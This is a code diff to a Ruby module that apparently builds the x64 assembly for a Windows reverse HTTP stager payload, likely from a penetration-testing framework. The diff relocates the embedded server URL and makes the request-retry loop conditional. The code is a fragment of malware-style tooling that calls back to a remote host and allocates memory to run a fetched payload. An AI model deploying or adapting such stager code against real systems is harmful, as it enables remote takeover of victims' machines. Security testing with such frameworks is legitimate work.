@@ -295,9 +295,8 @@ module Payload::Windows::ReverseHttp_x64
     end
 
     asm << %Q^
-
-        jmp get_server_uri
-
+        call httpopenrequest
+        db "#{opts[:url]}",0x0
       httpopenrequest:
         mov rcx, rax                  ; hConnect
         push rbx
@@ -314,11 +313,16 @@ module Payload::Windows::ReverseHttp_x64
 
       prepare:
         mov rsi, rax
-        push #{retry_count}
-        pop rdi
-
-      retryrequest:
     ^
+
+    if retry_count > 1
+      asm << %Q^
+          push #{retry_count}
+          pop rdi
+
+        retryrequest:
+      ^
+    end
 
     if opts[:ssl]
       asm << %Q^
@@ -349,18 +353,20 @@ module Payload::Windows::ReverseHttp_x64
         call rbp
         test eax, eax
         jnz allocate_memory
+    ^
 
+    if retry_count > 1
+      asm << %Q^
       try_it_again:
         dec rdi
         jz failure
         jmp retryrequest
-
-      get_server_uri:
-        call httpopenrequest
-
-      server_uri:
-        db "#{opts[:url]}",0x0
-    ^
+      ^
+    else
+      asm << %Q^
+        jmp failure
+      ^
+    end
 
     if opts[:exitfunk]
       asm << %Q^
